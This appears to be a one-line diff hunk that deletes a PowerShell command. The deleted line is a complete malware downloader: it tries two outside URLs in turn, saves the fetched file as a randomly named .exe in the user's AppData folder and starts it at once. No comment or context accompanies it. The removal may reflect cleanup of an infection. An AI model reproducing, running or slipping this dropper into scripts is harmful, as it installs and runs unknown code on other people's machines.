@@ -1,1 +1,0 @@
-$random = New-Object System.Random; Foreach($um in @({https://halido.loan/pago},{http://pilateszenter.com/index1.exe})) { try { $fg = $random.next(0, 61132); $pp = '%appdata%\' + $fg + '.exe'; (new-object system.net.webclient).DownloadFile($um.ToString(), $pp); Start-Process $pp; break; } catch { Write-Host $error[0].Exception } }
